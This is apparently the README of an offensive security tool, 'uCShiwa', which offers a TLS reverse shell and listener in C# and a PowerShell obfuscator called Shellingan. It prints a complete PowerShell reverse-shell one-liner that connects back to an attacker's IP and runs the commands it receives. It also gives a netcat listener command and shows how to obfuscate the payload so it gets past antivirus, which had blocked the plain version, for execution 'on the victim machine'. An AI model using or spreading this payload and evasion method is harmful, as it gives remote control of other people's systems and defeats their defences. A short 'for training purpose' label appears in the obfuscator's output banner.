# uCShiwa
- TLS encrypted reverseshell and listener in C#
- Obfuscation script in PowerShell.

![exemple1](https://github.com/Aif4thah/uCShiwa/blob/main/POC-v2-windows.PNG)

## Help & Documentation

Execute it without any options to print help

### listener

`Ucshiwa.exe <port> <certificate.pfx> <passwd>`

### reverse shell

`Ucshiwa.exe <ip> <port>`

### native shell

- batch
- Powershell (beta)

use `pwsh 1` to switch in powershell mode

## Linux

Thanks to the .NET Core, the listener running Linux

## Disclamer

Consider the online pfx file as compromised, use you own certificates !
you can use the `New-SelfSignedCertificate` cmdlet


## Using the Standalone Shellingan.ps1

This script is a simple recursive PowerShell command obfuscation function

### Import

```powershell
. .\shellingan.ps1
```

### Hello World 

```powershell
Invoke-Shellingan -cmd 'write helloworld' -iex $true -recurse 1
```
Then you just have to copy-paste the output where you want execute it.

### Obfuscation POC

![exemple2](https://github.com/Aif4thah/uCShiwa/blob/main/POC-Shellingan.png)

From your attack machine:
```console
nc64.exe -lnvp <port>
```

```powershell
$c=nEw-ObjeCt SYsTEm.nET.SOcKetS.tcpcLIENT((wRiTe-oUtpuT <attacking machine>),<port>);$s=$c.gETsTrEaM();[BYtE[]]$b=0..65535|%{0};wHILe(($i=$s.rEAd($b,0,$b.LENgTh))-NE0){$a=(NEw-oBJeCT -tYPenAME sYSteM.tEXT.aScIieNcOdInG).gETsTRIng($b,0,$i);$k=(iEX $a 2>&1|oUt-stRInG);$z=$k+(WrITe-OuTPut `>);$d=([teXT.eNcODiNg]::aSCii).gETByTEs($z);$s.wRiTE($d,0,$d.LEnGtH);$s.fLuSH()};$c.cLoSE()
```

```console
This script contains malicious content and has been blocked by your antivirus software.
```

```powershell
Invoke-Shellingan -iex $true -cmd '$c=nEw-ObjeCt SYsTEm.nET.SOcKetS.tcpcLIENT((wRiTe-oUtpuT <ip>),<port>);$s=$c.gETsTrEaM();[BYtE[]]$b=0..65535|%{0};wHILe(($i=$s.rEAd($b,0,$b.LENgTh))-NE0){$a=(NEw-oBJeCT -tYPenAME sYSteM.tEXT.aScIieNcOdInG).gETsTRIng($b,0,$i);$k=(iEX $a 2>&1|oUt-stRInG);$z=$k+(WrITe-OuTPut `>);$d=([teXT.eNcODiNg]::aSCii).gETByTEs($z);$s.wRiTE($d,0,$d.LEnGtH);$s.fLuSH()};$c.cLoSE()'
```

output:
```powershell
<O> SHELLINGAN : Simple Recursive Powershell Command Obfuscation - for training purpose
|
<cmd> : $c=nEw-ObjeCt SYsTEm.nET.SOcKetS.tcpcLIENT...
<iex> : True
<rec> : 0
|
<O> SHELLINGAN:
$186=255;$208=[SYStEM.TexT.ENCoDiNg];$102=$208::Utf8.gETByTeS('');$208::AsCii.GetString($(([bytE]55,86,80,97...
```
Copy and Execute the output on the victim machine to get your reverse shell !

### Shellingan Options

```console
-cmd: Mandatory
-iex: add invoke-expression (usefull to execute your commands)
-recurse: number of obfuscation loop (increase output length!)
```

